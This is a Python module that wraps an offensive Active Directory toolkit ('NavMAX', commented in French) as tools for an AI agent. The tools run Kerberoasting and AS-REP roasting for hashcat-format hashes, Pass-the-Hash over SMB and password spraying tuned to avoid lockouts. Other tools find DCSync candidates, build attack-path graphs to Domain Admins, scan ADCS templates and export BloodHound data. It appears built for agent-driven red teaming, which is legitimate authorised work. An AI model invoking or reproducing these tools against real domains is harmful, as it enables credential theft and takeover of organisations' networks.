"""NavMAX AD Tools — wrappers LangChain pour les modules AD NavMAX.

Chaque tool est une classe avec :
- .name       : str — identifiant unique du tool
- .description: str — description pour l'agent
- .Input      : pydantic.BaseModel — schéma d'entrée
- .output_type: type | None — type de sortie optionnel
- async ainvoke(input) : Any — méthode d'appel asynchrone

Les tools utilisent les vrais modules NavMAX AD :
- decepticon.navmax.ad.connector
- decepticon.navmax.ad.enumerator
- decepticon.navmax.ad.vuln_scanner
- decepticon.navmax.ad.password_spray
- decepticon.navmax.ad.trust_graph
- decepticon.navmax.ad.adcs_scanner
- decepticon.navmax.ad.bloodhound_export
"""

from __future__ import annotations

import json
from typing import Any

from pydantic import BaseModel, Field

from decepticon.navmax.ad.connector import (
    ADAuthMethod,
    ADConfig,
    ADConnector,
    ADSearchScope,
)
from decepticon.navmax.ad.enumerator import ADEnumerator, EnumerationResult
from decepticon.navmax.ad.password_spray import (
    PasswordSprayer,
    SprayConfig,
    SprayMode,
)
from decepticon.navmax.ad.trust_graph import ADTrustGraph, AttackPath
from decepticon.navmax.ad.vuln_scanner import ADVulnScanner, ScanReport
from decepticon.navmax.ad.adcs_scanner import ADCSSCanner, ADCSReport
from decepticon.navmax.ad.bloodhound_export import BloodHoundExporter, ExportResult

# ── Helpers ──────────────────────────────────────────────────────


def _json(data: Any) -> str:
    """Encodage JSON propre avec support des types non-sérialisables."""
    return json.dumps(data, indent=2, default=str, ensure_ascii=False)


def _make_config(
    server: str,
    domain: str,
    username: str | None = None,
    password: str | None = None,
    auth_method: str = "simple",
    use_ssl: bool = True,
    timeout: float = 30.0,
) -> ADConfig:
    """Construit une configuration ADConfig à partir des paramètres bruts."""
    return ADConfig(
        server=server,
        domain=domain,
        username=username,
        password=password,
        auth_method=ADAuthMethod(auth_method),
        use_ssl=use_ssl,
        timeout=timeout,
    )


async def _connect_and_enumerate(
    server: str,
    domain: str,
    username: str | None = None,
    password: str | None = None,
    auth_method: str = "simple",
    use_ssl: bool = True,
    timeout: float = 30.0,
    parallel: bool = True,
    max_objects: int = 50000,
) -> tuple[ADConnector, Any, EnumerationResult]:
    """Connecte, énumère et retourne (connector, domain_map, result).

    Utilitaire partagé par les tools qui ont besoin d'un état AD complet.
    """
    config = _make_config(server, domain, username, password, auth_method, use_ssl, timeout)
    connector = ADConnector(config)
    await connector.connect()

    enumerator = ADEnumerator(connector, parallel=parallel, max_objects=max_objects)
    domain_map = await enumerator.enumerate_all()

    result = EnumerationResult(
        domain=domain,
        domain_map=domain_map,
        objects_collected=domain_map.total_objects,
        duration_seconds=domain_map.enumeration_time,
        errors=list(domain_map.errors),
    )
    return connector, domain_map, result


# ─── 1. NavmaxADConnect ──────────────────────────────────────────


class NavmaxADConnect:
    """Connecte à un contrôleur de domaine Active Directory et retourne les infos du domaine."""

    name = "navmax_ad_connect"
    description = (
        "Connecte à un contrôleur de domaine Active Directory via LDAP/LDAPS "
        "et retourne les informations du domaine (nom, SID, niveau fonctionnel, forêt, DCs)."
    )
    output_type = str

    class Input(BaseModel):
        server: str = Field(description="DC hostname ou IP")
        domain: str = Field(description="Nom de domaine (ex: internal.corp)")
        username: str = Field(default="", description="Compte (UPN ou SAM)")
        password: str = Field(default="", description="Mot de passe")
        auth_method: str = Field(default="simple", description="simple | ntlm | anonymous")
        use_ssl: bool = Field(default=True, description="LDAPS (port 636)")
        timeout: float = Field(default=30.0, description="Timeout connexion (secondes)")

    async def ainvoke(self, input_data: Input | dict) -> str:
        if isinstance(input_data, dict):
            input_data = self.Input(**input_data)
        config = _make_config(
            server=input_data.server,
            domain=input_data.domain,
            username=input_data.username or None,
            password=input_data.password or None,
            auth_method=input_data.auth_method,
            use_ssl=input_data.use_ssl,
            timeout=input_data.timeout,
        )
        connector = ADConnector(config)
        try:
            await connector.connect()
            info = await connector.get_domain_info()
            return _json(
                {
                    "connected": True,
                    "server": input_data.server,
                    "domain": input_data.domain,
                    "domain_info": info,
                }
            )
        finally:
            await connector.close()


# ─── 2. NavmaxADEnumerate ────────────────────────────────────────


class NavmaxADEnumerate:
    """Énumération complète d'un domaine Active Directory (users, groups, computers, OUs, GPOs, trusts)."""

    name = "navmax_ad_enumerate"
    description = (
        "Énumère tous les objets d'un domaine Active Directory : "
        "utilisateurs, groupes, ordinateurs, unités d'organisation, GPOs et relations de confiance. "
        "Retourne un résumé structuré avec les compteurs clés (kerberoastable, AS-REP, admins, délégations)."
    )
    output_type = str

    class Input(BaseModel):
        server: str = Field(description="DC hostname ou IP")
        domain: str = Field(description="Nom de domaine (ex: internal.corp)")
        username: str = Field(default="", description="Compte (UPN ou SAM)")
        password: str = Field(default="", description="Mot de passe")
        auth_method: str = Field(default="simple", description="simple | ntlm | anonymous")
        use_ssl: bool = Field(default=True, description="LDAPS (port 636)")
        timeout: float = Field(default=30.0, description="Timeout connexion (secondes)")
        parallel: bool = Field(default=True, description="Énumération parallèle")
        max_objects: int = Field(default=50000, description="Limite totale d'objets")

    async def ainvoke(self, input_data: Input | dict) -> str:
        if isinstance(input_data, dict):
            input_data = self.Input(**input_data)
        connector, _domain_map, result = await _connect_and_enumerate(
            server=input_data.server,
            domain=input_data.domain,
            username=input_data.username or None,
            password=input_data.password or None,
            auth_method=input_data.auth_method,
            use_ssl=input_data.use_ssl,
            timeout=input_data.timeout,
            parallel=input_data.parallel,
            max_objects=input_data.max_objects,
        )
        await connector.close()

        dm = result.domain_map
        return _json(
            {
                "domain": result.domain,
                "success": True,
                "objects_collected": result.objects_collected,
                "duration_seconds": result.duration_seconds,
                "summary": {
                    "users": {
                        "total": len(dm.users),
                        "enabled": len(dm.users) - len(dm.disabled_users),
                        "disabled": len(dm.disabled_users),
                        "privileged": len(dm.privileged_users),
                        "kerberoastable": len(dm.kerberoastable_users),
                        "asrep_roastable": len(dm.asrep_roastable_users),
                        "password_never_expires": len(dm.users_without_password_expiry),
                        "domain_admins": len(dm.domain_admins),
                        "enterprise_admins": len(dm.enterprise_admins),
                    },
                    "groups": {
                        "total": len(dm.groups),
                        "security_groups": len([g for g in dm.groups if g.is_security_group]),
                    },
                    "computers": {
                        "total": len(dm.computers),
                        "domain_controllers": len(dm.domain_controllers),
                        "unconstrained_delegation": len(dm.unconstrained_delegation_computers),
                    },
                    "ous": len(dm.ous),
                    "gpos": len(dm.gpos),
                    "trusts": len(dm.trusts),
                },
                "domain_info": {
                    "name": dm.domain.name,
                    "netbios": dm.domain.netbios_name,
                    "sid": dm.domain.sid,
                    "functional_level": dm.domain.functional_level,
                    "forest": dm.domain.forest,
                },
                "errors": result.errors,
            }
        )


# ─── 3. NavmaxADKerberoast ────────────────────────────────────────


class NavmaxADKerberoast:
    """Effectue une attaque Kerberoasting sur un utilisateur cible via impacket."""

    name = "navmax_ad_kerberoast"
    description = (
        "Effectue une attaque Kerberoasting sur un utilisateur AD cible. "
        "Demande un TGS pour le SPN de l'utilisateur et extrait le hash au format hashcat ($krb5tgs$). "
        "Ne nécéssite qu'un compte domaine standard."
    )
    output_type = str

    class Input(BaseModel):
        server: str = Field(description="DC hostname ou IP")
        domain: str = Field(description="Nom de domaine")
        target_user: str = Field(description="sAMAccountName ou UPN de l'utilisateur cible")
        domain_user: str = Field(default="", description="Compte domaine pour l'auth")
        domain_password: str = Field(default="", description="Mot de passe du compte")
        timeout: float = Field(default=30.0, description="Timeout connexion")

    async def ainvoke(self, input_data: Input | dict) -> str:
        if isinstance(input_data, dict):
            input_data = self.Input(**input_data)
        config = _make_config(
            server=input_data.server,
            domain=input_data.domain,
            username=input_data.domain_user or None,
            password=input_data.domain_password or None,
            timeout=input_data.timeout,
        )
        connector = ADConnector(config)
        try:
            await connector.connect()
            result = await connector.kerberoast(
                target_user=input_data.target_user,
                domain=input_data.domain,
            )
            return _json(result)
        finally:
            await connector.close()


# ─── 4. NavmaxADAsrepRoast ───────────────────────────────────────


class NavmaxADAsrepRoast:
    """Effectue une attaque AS-REP Roasting sur un utilisateur sans pré-authentification."""

    name = "navmax_ad_asrep_roast"
    description = (
        "Effectue une attaque AS-REP Roasting sur un utilisateur AD. "
        "Cible les comptes avec le flag DONT_REQ_PREAUTH activé. "
        "Extrait le hash au format hashcat ($krb5asrep$, mode 18200)."
    )
    output_type = str

    class Input(BaseModel):
        server: str = Field(description="DC hostname ou IP")
        domain: str = Field(description="Nom de domaine")
        target_user: str = Field(description="sAMAccountName ou UPN de l'utilisateur cible")
        domain_user: str = Field(default="", description="Compte domaine pour l'auth")
        domain_password: str = Field(default="", description="Mot de passe du compte")
        timeout: float = Field(default=30.0, description="Timeout connexion")

    async def ainvoke(self, input_data: Input | dict) -> str:
        if isinstance(input_data, dict):
            input_data = self.Input(**input_data)
        config = _make_config(
            server=input_data.server,
            domain=input_data.domain,
            username=input_data.domain_user or None,
            password=input_data.domain_password or None,
            timeout=input_data.timeout,
        )
        connector = ADConnector(config)
        try:
            await connector.connect()
            result = await connector.asrep_roast(
                target_user=input_data.target_user,
                domain=input_data.domain,
            )
            return _json(result)
        finally:
            await connector.close()


# ─── 5. NavmaxADDcsyncCheck ──────────────────────────────────────


class NavmaxADDcsyncCheck:
    """Analyse les permissions DCSync via le trust graph NavMAX — identifie les principaux capable de DCSync."""

    name = "navmax_ad_dcsync_check"
    description = (
        "Analyse les permissions DCSync dans un domaine Active Directory. "
        "Construit le trust graph NavMAX et identifie les utilisateurs, groupes "
        "et machines qui ont les droits de réplication (Replicating Directory Changes). "
        "Retourne les candidats DCSync avec leur chemin d'attaque."
    )
    output_type = str

    class Input(BaseModel):
        server: str = Field(description="DC hostname ou IP")
        domain: str = Field(description="Nom de domaine")
        username: str = Field(default="", description="Compte domaine")
        password: str = Field(default="", description="Mot de passe")
        auth_method: str = Field(default="simple", description="simple | ntlm | anonymous")
        use_ssl: bool = Field(default=True, description="LDAPS")
        timeout: float = Field(default=30.0, description="Timeout connexion")

    async def ainvoke(self, input_data: Input | dict) -> str:
        if isinstance(input_data, dict):
            input_data = self.Input(**input_data)
        connector, domain_map, _enum_result = await _connect_and_enumerate(
            server=input_data.server,
            domain=input_data.domain,
            username=input_data.username or None,
            password=input_data.password or None,
            auth_method=input_data.auth_method,
            use_ssl=input_data.use_ssl,
            timeout=input_data.timeout,
        )
        try:
            # Construire le trust graph
            graph = ADTrustGraph()
            graph.build(domain_map)

            # Chercher les utilisateurs avec des droits étendus
            # via le graphe : les membres de groupes admin ont AdminTo sur les DCs
            dcsync_candidates = []
            da_group_dn = None
            for g in domain_map.groups:
                if g.sam_account_name.lower() == "domain admins":
                    da_group_dn = g.dn
                    break

            # Énumérer les utilisateurs qui peuvent atteindre Domain Admins
            if da_group_dn:
                for user in domain_map.users:
                    if user.is_admin:
                        path = graph.find_shortest_path_to_da(user.sam_account_name)
                        dcsync_candidates.append(
                            {
                                "sam": user.sam_account_name,
                                "upn": user.user_principal_name,
                                "admin_count": user.admin_count,
                                "dcsync_path": (
                                    {
                                        "length": path.length,
                                        "path_labels": path.path_labels,
                                        "risk_score": path.risk_score,
                                    }
                                    if path
                                    else None
                                ),
                            }
                        )

            # Ajouter les groupes connus pour DCSync
            dcsync_groups = []
            for group in domain_map.groups:
                sam_lower = group.sam_account_name.lower()
                if any(
                    kw in sam_lower
                    for kw in [
                        "domain admins",
                        "enterprise admins",
                        "administrators",
                        "backup operators",
                        "exchange",
                    ]
                ):
                    dcsync_groups.append(
                        {
                            "sam": group.sam_account_name,
                            "members_count": len(group.members),
                            "admin_count": group.admin_count,
                        }
                    )

            return _json(
                {
                    "domain": input_data.domain,
                    "dcsync_candidates": dcsync_candidates,
                    "dcsync_eligible_groups": dcsync_groups,
                    "total_candidates": len(dcsync_candidates),
                    "total_groups": len(dcsync_groups),
                    "warning": (
                        "Les candidats DCSync listés sont les principaux avec des droits "
                        "élevés. Vérifier les ACLs (Replicating Directory Changes) via "
                        "BloodHound pour une analyse complète."
                    ),
                }
            )
        finally:
            await connector.close()


# ─── 6. NavmaxADPassTheHash ──────────────────────────────────────


class NavmaxADPassTheHash:
    """Authentification Pass-the-Hash via SMB en utilisant un hash NTLM."""

    name = "navmax_ad_pass_the_hash"
    description = (
        "Effectue une authentification Pass-the-Hash via le protocole SMB. "
        "Utilise un hash NTLM (32 caractères hex) au lieu du mot de passe pour "
        "s'authentifier sur une machine distante. Retourne les informations OS "
        "et la liste des partages SMB accessibles."
    )
    output_type = str

    class Input(BaseModel):
        server: str = Field(description="DC hostname ou IP (pour la connexion)")
        domain: str = Field(description="Nom de domaine")
        target_host: str = Field(description="Adresse IP ou hostname de la cible")
        username: str = Field(description="Nom d'utilisateur SAM")
        nthash: str = Field(description="Hash NTLM (32 caractères hexadécimaux)")
        domain_user: str = Field(default="", description="Compte LDAP (optionnel si auth NTLM)")
        domain_password: str = Field(default="", description="Mot de passe LDAP (optionnel)")
        timeout: float = Field(default=30.0, description="Timeout connexion")

    async def ainvoke(self, input_data: Input | dict) -> str:
        if isinstance(input_data, dict):
            input_data = self.Input(**input_data)
        config = _make_config(
            server=input_data.server,
            domain=input_data.domain,
            username=input_data.domain_user or None,
            password=input_data.domain_password or None,
            timeout=input_data.timeout,
        )
        connector = ADConnector(config)
        try:
            # Connexion LDAP nécessaire pour initialiser impacket
            await connector.connect()
            result = await connector.pass_the_hash(
                target_host=input_data.target_host,
                username=input_data.username,
                nthash=input_data.nthash,
                domain=input_data.domain,
            )
            return _json(result)
        finally:
            await connector.close()


# ─── 7. NavmaxADPasswordSpray ────────────────────────────────────


class NavmaxADPasswordSpray:
    """Pulvérisation intelligente de mots de passe (password spraying) sur un domaine AD."""

    name = "navmax_ad_password_spray"
    description = (
        "Effectue une attaque par pulvérisation de mots de passe (password spraying) "
        "sur un domaine Active Directory. Teste UN mot de passe à la fois sur tous "
        "les utilisateurs pour éviter les lockouts. Supporte les wordlists intégrées "
        "(saisonnières, corporate) et personnalisées. Mode dry-run disponible."
    )
    output_type = str

    class Input(BaseModel):
        server: str = Field(description="DC hostname ou IP")
        domain: str = Field(description="Nom de domaine")
        username: str = Field(description="Compte domaine pour l'auth")
        password: str = Field(description="Mot de passe du compte")
        auth_method: str = Field(default="simple", description="simple | ntlm")
        use_ssl: bool = Field(default=True, description="LDAPS")
        timeout: float = Field(default=60.0, description="Timeout connexion")
        wordlist: list[str] = Field(
            default_factory=list,
            description="Liste de mots de passe à tester. Vide = wordlist par défaut",
        )
        mode: str = Field(
            default="safe",
            description="safe (30min), normal (5min), aggressive (30s), custom",
        )
        dry_run: bool = Field(default=False, description="Mode simulation (ne test rien)")
        avoid_disabled: bool = Field(default=True, description="Ignorer les comptes désactivés")
        avoid_admin: bool = Field(default=False, description="⚠️ Ignorer les comptes admin")
        delay_seconds: float = Field(default=0.0, description="Délai custom (si mode=custom)")
        max_attempts_before_rest: int = Field(default=3, description="Pause après N tentatives")

    async def ainvoke(self, input_data: Input | dict) -> str:
        if isinstance(input_data, dict):
            input_data = self.Input(**input_data)
        config = _make_config(
            server=input_data.server,
            domain=input_data.domain,
            username=input_data.username,
            password=input_data.password,
            auth_method=input_data.auth_method,
            use_ssl=input_data.use_ssl,
            timeout=input_data.timeout,
        )
        connector = ADConnector(config)
        try:
            await connector.connect()

            # Config spray
            spray_cfg = SprayConfig(
                mode=SprayMode(input_data.mode),
                avoid_disabled=input_data.avoid_disabled,
                avoid_admin=input_data.avoid_admin,
                dry_run=input_data.dry_run,
                max_attempts_before_rest=input_data.max_attempts_before_rest,
            )
            if input_data.mode == "custom" and input_data.delay_seconds > 0:
                spray_cfg.delay_seconds = input_data.delay_seconds

            sprayer = PasswordSprayer(connector=connector, config=spray_cfg)

            if input_data.wordlist:
                sprayer.set_wordlist(input_data.wordlist)
            else:
                sprayer.load_default_wordlist()

            # Énumérer les utilisateurs
            enumerator = ADEnumerator(connector, parallel=True)
            domain_map = await enumerator.enumerate_all()

            # Exécuter le spray
            session = await sprayer.spray_all_users(domain_map)

            return _json(
                {
                    "domain": input_data.domain,
                    "success": session.successes,
                    "summary": {
                        "total_users": session.total_users,
                        "total_passwords": session.total_passwords,
                        "total_attempts": session.total_attempts,
                        "successes": len(session.successes),
                        "failures": session.failures,
                        "lockouts_detected": session.lockouts_detected,
                        "duration_seconds": session.duration_seconds,
                        "aborted": session.aborted,
                        "abort_reason": session.abort_reason,
                    },
                }
            )
        finally:
            await connector.close()


# ─── 8. NavmaxADTrustGraph ───────────────────────────────────────


class NavmaxADTrustGraph:
    """Construit le graphe d'attaque AD et trouve les chemins vers Domain Admins."""

    name = "navmax_ad_trust_graph"
    description = (
        "Construit le graphe d'attaque Active Directory complet (NetworkX) à partir "
        "d'une énumération AD. Analyse les relations de confiance, les appartenances "
        "aux groupes, les SPNs, les délégations. Trouve les chemins d'attaque les "
        "plus courts vers Domain Admins, les comptes kerberoastable exposés, "
        "et les cibles à haute valeur."
    )
    output_type = str

    class Input(BaseModel):
        server: str = Field(description="DC hostname ou IP")
        domain: str = Field(description="Nom de domaine")
        username: str = Field(default="", description="Compte domaine")
        password: str = Field(default="", description="Mot de passe")
        auth_method: str = Field(default="simple", description="simple | ntlm | anonymous")
        use_ssl: bool = Field(default=True, description="LDAPS")
        timeout: float = Field(default=30.0, description="Timeout connexion")
        target_user: str = Field(
            default="",
            description="sAMAccountName pour trouver les chemins vers DA (optionnel)",
        )

    async def ainvoke(self, input_data: Input | dict) -> str:
        if isinstance(input_data, dict):
            input_data = self.Input(**input_data)
        connector, domain_map, _ = await _connect_and_enumerate(
            server=input_data.server,
            domain=input_data.domain,
            username=input_data.username or None,
            password=input_data.password or None,
            auth_method=input_data.auth_method,
            use_ssl=input_data.use_ssl,
            timeout=input_data.timeout,
        )
        try:
            graph = ADTrustGraph()
            graph.build(domain_map)

            result: dict[str, Any] = {
                "domain": input_data.domain,
                "graph_stats": {
                    "nodes": graph.node_count,
                    "edges": graph.edge_count,
                },
                "effective_domain_admins": graph.get_effective_domain_admins(),
                "asrep_roastable_targets": graph.find_asrep_roastable_targets(),
                "unconstrained_delegation_hosts": graph.find_unconstrained_delegation_hosts(),
            }

            # Chemin d'attaque si un utilisateur cible est spécifié
            if input_data.target_user:
                path = graph.find_shortest_path_to_da(input_data.target_user)
                if path:
                    result["attack_path_to_da"] = {
                        "user": input_data.target_user,
                        "length": path.length,
                        "path_labels": path.path_labels,
                        "edge_types": [str(e) for e in path.edge_types],
                        "risk_score": path.risk_score,
                        "description": path.description,
                    }
                else:
                    result["attack_path_to_da"] = None

                # Chemins kerberoastable accessibles
                kerb_paths = graph.find_kerberoastable_paths()
                result["kerberoastable_paths"] = [
                    {
                        "description": p.description,
                        "length": p.length,
                        "path_labels": p.path_labels,
                        "risk_score": p.risk_score,
                    }
                    for p in kerb_paths[:10]
                ]

                # Chemins inter-domaines
                cross_paths = graph.find_cross_domain_attack_paths()
                result["cross_domain_paths"] = [
                    {
                        "description": p.description,
                        "length": p.length,
                        "path_labels": p.path_labels,
                        "risk_score": p.risk_score,
                    }
                    for p in cross_paths[:10]
                ]

            return _json(result)
        finally:
            await connector.close()


# ─── 9. NavmaxADADCSscan ──────────────────────────────────────────


class NavmaxADADCSscan:
    """Scanne les vulnérabilités Active Directory Certificate Services (ESC1-ESC13)."""

    name = "navmax_ad_adcs_scan"
    description = (
        "Scanne les vulnérabilités ADCS (Active Directory Certificate Services) "
        "selon les techniques ESC1 à ESC13. Détecte les templates vulnérables, "
        "les CA mal configurées, les permissions faibles, les relais NTLM, "
        "et les mappings de certificat dangereux."
    )
    output_type = str

    class Input(BaseModel):
        server: str = Field(description="DC hostname ou IP")
        domain: str = Field(description="Nom de domaine")
        username: str = Field(default="", description="Compte domaine")
        password: str = Field(default="", description="Mot de passe")
        auth_method: str = Field(default="simple", description="simple | ntlm | anonymous")
        use_ssl: bool = Field(default=True, description="LDAPS")
        timeout: float = Field(default=30.0, description="Timeout connexion")

    async def ainvoke(self, input_data: Input | dict) -> str:
        if isinstance(input_data, dict):
            input_data = self.Input(**input_data)
        connector, domain_map, _ = await _connect_and_enumerate(
            server=input_data.server,
            domain=input_data.domain,
            username=input_data.username or None,
            password=input_data.password or None,
            auth_method=input_data.auth_method,
            use_ssl=input_data.use_ssl,
            timeout=input_data.timeout,
        )
        try:
            scanner = ADCSSCanner(connector=connector)
            report: ADCSReport = await scanner.scan_all(domain_map)

            return _json(
                {
                    "domain": input_data.domain,
                    "success": True,
                    "summary": report.summary(),
                    "cas": [
                        {
                            "name": ca.name,
                            "dns_hostname": ca.dns_hostname,
                            "editf_attributesubjectaltname2": ca.editf_attributesubjectaltname2,
                            "web_enrollment_enabled": ca.web_enrollment_enabled,
                            "web_enrollment_url": ca.web_enrollment_url,
                        }
                        for ca in report.cas
                    ],
                    "findings": [
                        {
                            "esc_id": f.esc_id,
                            "title": f.title,
                            "description": f.description,
                            "severity": f.severity,
                            "affected_templates": f.affected_templates,
                            "affected_cas": f.affected_cas,
                            "exploitation": f.exploitation,
                            "remediation": f.remediation,
                        }
                        for f in report.findings
                    ],
                    "errors": report.errors,
                }
            )
        finally:
            await connector.close()


# ─── 10. NavmaxADBloodHoundExport ────────────────────────────────


class NavmaxADBloodHoundExport:
    """Exporte le graphe d'attaque AD au format BloodHound JSON (v5)."""

    name = "navmax_ad_bloodhound_export"
    description = (
        "Exporte le trust graph NavMAX au format BloodHound JSON v5. "
        "Produit un fichier JSON compatible avec BloodHound CE ou BloodHound Legacy. "
        "Inclut tous les nœuds (users, groups, computers, domains) et les relations "
        "(MemberOf, AdminTo, HasSession, SPN, AS-REP, délégations)."
    )
    output_type = str

    class Input(BaseModel):
        server: str = Field(description="DC hostname ou IP")
        domain: str = Field(description="Nom de domaine")
        username: str = Field(default="", description="Compte domaine")
        password: str = Field(default="", description="Mot de passe")
        auth_method: str = Field(default="simple", description="simple | ntlm | anonymous")
        use_ssl: bool = Field(default=True, description="LDAPS")
        timeout: float = Field(default=30.0, description="Timeout connexion")
        output_path: str = Field(
            default="",
            description="Chemin de sortie du fichier JSON (vide = généré automatiquement)",
        )

    async def ainvoke(self, input_data: Input | dict) -> str:
        if isinstance(input_data, dict):
            input_data = self.Input(**input_data)
        connector, domain_map, _ = await _connect_and_enumerate(
            server=input_data.server,
            domain=input_data.domain,
            username=input_data.username or None,
            password=input_data.password or None,
            auth_method=input_data.auth_method,
            use_ssl=input_data.use_ssl,
            timeout=input_data.timeout,
        )
        try:
            # Construire le trust graph
            graph = ADTrustGraph()
            graph.build(domain_map)

            # Exporter
            exporter = BloodHoundExporter()
            bh_data = exporter.export(graph)

            output_path = input_data.output_path or f"bloodhound_{input_data.domain}.json"
            export_result: ExportResult = exporter.save(bh_data, output_path)

            return _json(
                {
                    "domain": input_data.domain,
                    "export_file": export_result.filepath,
                    "node_count": export_result.node_count,
                    "edge_count": export_result.edge_count,
                    "file_size_bytes": export_result.file_size_bytes,
                    "success": len(export_result.errors) == 0,
                    "errors": export_result.errors,
                }
            )
        finally:
            await connector.close()


# ─── 11. NavmaxADVulnScan ─────────────────────────────────────────


class NavmaxADVulnScan:
    """Scan de vulnérabilités AD complet : Kerberoasting, AS-REP, délégations, SMB, LDAP."""

    name = "navmax_ad_vuln_scan"
    description = (
        "Scan de vulnérabilités complet d'un domaine Active Directory. "
        "Détecte : comptes kerberoastable, AS-REP roastable, délégations non contraintes, "
        "SMB signing désactivé, LDAP signing manquant, politique de mot de passe faible, "
        "comptes privilégiés exposés, ACLs dangereuses, et mots de passe par défaut."
    )
    output_type = str

    class Input(BaseModel):
        server: str = Field(description="DC hostname ou IP")
        domain: str = Field(description="Nom de domaine")
        username: str = Field(default="", description="Compte domaine")
        password: str = Field(default="", description="Mot de passe")
        auth_method: str = Field(default="simple", description="simple | ntlm | anonymous")
        use_ssl: bool = Field(default=True, description="LDAPS")
        timeout: float = Field(default=30.0, description="Timeout connexion")

    async def ainvoke(self, input_data: Input | dict) -> str:
        if isinstance(input_data, dict):
            input_data = self.Input(**input_data)
        connector, domain_map, _ = await _connect_and_enumerate(
            server=input_data.server,
            domain=input_data.domain,
            username=input_data.username or None,
            password=input_data.password or None,
            auth_method=input_data.auth_method,
            use_ssl=input_data.use_ssl,
            timeout=input_data.timeout,
        )
        try:
            scanner = ADVulnScanner(connector=connector)
            scan_report: ScanReport = await scanner.scan_all(domain_map)

            return _json(
                {
                    "domain": input_data.domain,
                    "success": True,
                    "scan_report": scan_report.summary() if hasattr(scan_report, "summary") else "",
                    "critical": len([f for f in scan_report.findings if f.severity == "critical"]),
                    "high": len([f for f in scan_report.findings if f.severity == "high"]),
                    "medium": len([f for f in scan_report.findings if f.severity == "medium"]),
                    "low": len([f for f in scan_report.findings if f.severity == "low"]),
                    "findings": [
                        {
                            "title": f.title,
                            "description": f.description,
                            "severity": f.severity,
                            "category": f.category,
                            "affected_assets": f.affected_assets,
                            "affected_count": f.affected_count,
                            "remediation": f.remediation,
                        }
                        for f in scan_report.findings
                    ],
                    "errors": scan_report.errors,
                }
            )
        finally:
            await connector.close()


# ─── 12. NavmaxADSearch ────────────────────────────────────────────


class NavmaxADSearch:
    """Recherche LDAP générique dans Active Directory."""

    name = "navmax_ad_search"
    description = (
        "Effectue une recherche LDAP personnalisée dans Active Directory. "
        "Utilise des filtres LDAP standard (ex: (objectClass=user), "
        "(&(objectCategory=person)(department=IT))). Supporte le choix des "
        "attributs, la pagination et la limitation du nombre de résultats."
    )
    output_type = str

    class Input(BaseModel):
        server: str = Field(description="DC hostname ou IP")
        domain: str = Field(description="Nom de domaine")
        username: str = Field(default="", description="Compte domaine")
        password: str = Field(default="", description="Mot de passe")
        auth_method: str = Field(default="simple", description="simple | ntlm | anonymous")
        use_ssl: bool = Field(default=True, description="LDAPS")
        timeout: float = Field(default=30.0, description="Timeout connexion")
        search_filter: str = Field(description="Filtre LDAP (ex: (objectClass=user))")
        search_base: str = Field(default="", description="Base DN (vide = base du domaine)")
        attributes: list[str] = Field(
            default_factory=list,
            description="Attributs à retourner (vide = tous)",
        )
        max_entries: int = Field(default=500, description="Nombre max de résultats")

    async def ainvoke(self, input_data: Input | dict) -> str:
        if isinstance(input_data, dict):
            input_data = self.Input(**input_data)
        config = _make_config(
            server=input_data.server,
            domain=input_data.domain,
            username=input_data.username or None,
            password=input_data.password or None,
            auth_method=input_data.auth_method,
            use_ssl=input_data.use_ssl,
            timeout=input_data.timeout,
        )
        connector = ADConnector(config)
        try:
            await connector.connect()
            entries = await connector.search(
                search_filter=input_data.search_filter,
                search_base=input_data.search_base or None,
                attributes=list(input_data.attributes) if input_data.attributes else None,
                max_entries=input_data.max_entries,
            )
            return _json(
                {
                    "domain": input_data.domain,
                    "filter": input_data.search_filter,
                    "results_count": len(entries),
                    "entries": entries[: input_data.max_entries],
                }
            )
        finally:
            await connector.close()


# ─── Registre ─────────────────────────────────────────────────────

NAVMAX_AD_TOOLS: list[Any] = [
    NavmaxADConnect(),
    NavmaxADEnumerate(),
    NavmaxADKerberoast(),
    NavmaxADAsrepRoast(),
    NavmaxADDcsyncCheck(),
    NavmaxADPassTheHash(),
    NavmaxADPasswordSpray(),
    NavmaxADTrustGraph(),
    NavmaxADADCSscan(),
    NavmaxADBloodHoundExport(),
    NavmaxADVulnScan(),
    NavmaxADSearch(),
]
